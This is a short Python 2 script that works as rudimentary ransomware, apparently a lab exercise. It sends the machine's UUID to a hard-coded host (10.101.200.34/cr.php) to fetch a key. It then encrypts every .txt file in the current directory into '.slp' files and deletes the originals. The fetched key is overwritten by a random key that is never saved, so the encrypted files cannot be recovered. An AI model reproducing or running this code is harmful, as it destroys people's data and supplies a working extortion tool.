import requests, os, re, subprocess, StringIO
from cryptography.fernet import Fernet

x = subprocess.check_output('wmic csproduct get UUID')
content = x.split("\n")[1]

url = "http://10.101.200.34/cr.php?args="
r = requests.get(url + "\"" + content + "\"")
key = r.text
key = key.strip()
print "La cle : " + key

file_list = os.listdir(".")

for filename in file_list:
    if filename.endswith('.txt'):

        # Open file and convert to bytes
        fic = open(filename,"r")
        msg = fic.read()
        msg = bytes(msg)

        # Encrypt the file content
        key = Fernet.generate_key()
        f = Fernet(key)
        token = f.encrypt(msg)

        # Create the "slp" file
        filename2 = filename.split(".")[0] + ".slp"
        fic = open(filename2, "w")
        fic.write(token)
        fic.close()

        os.remove(filename)
